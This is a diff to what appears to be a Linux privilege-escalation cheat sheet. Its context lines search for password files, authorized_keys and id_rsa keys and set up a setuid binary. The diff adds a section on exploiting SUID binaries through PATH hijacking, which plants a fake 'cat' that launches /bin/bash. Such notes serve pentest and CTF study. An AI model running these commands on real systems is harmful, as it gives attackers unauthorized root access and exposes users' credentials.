@@ -48,6 +48,8 @@ locate password
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
 
+## Last Edited Files
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
 # Detect CRON jobs
 ## print both commands and file system events and scan procfs every 1000 ms (=1sec)
@@ -63,5 +65,11 @@ gcc -o /tmp/suid /tmp/suid.c
 sudo chmod +x /tmp/suid # execute right
 sudo chmod +s /tmp/suid # setuid bit
 
-## Last Edited Files
-find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+# Exploiting SUID binaries
+## Relative Path (Whenever a SUID binary is calling a program, e.g., cat)
+echo $PATH
+echo '/bin/bash' > /tmp/cat
+chmod 777 cat
+export PATH=/tmp:$PATH
+
+
